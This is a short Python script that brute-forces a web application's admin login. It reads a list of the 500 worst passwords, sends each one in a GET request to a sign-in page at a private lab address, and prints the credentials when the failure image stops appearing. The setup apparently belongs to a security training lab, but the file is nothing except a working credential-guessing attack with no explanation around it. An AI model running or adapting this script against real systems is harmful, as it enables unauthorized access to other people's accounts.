import requests

file = open("500-worst-passwords.txt", "r")
for i in file.readlines():
	url = f"http://192.168.56.134/?page=signin&username=admin&password={i[0:len(i)-1]}&Login=Login"
	res = requests.get(url)
	print(".", end=' ', flush=True)
	if "WrongAnswer.gif" not in str(res.content):
		print("\n" + url)
		print("*"*20 + "\n" + "Username: Admin\nPassword: " + i[0:len(i)-1] + "\n" + "*"*20)
		break
file.close()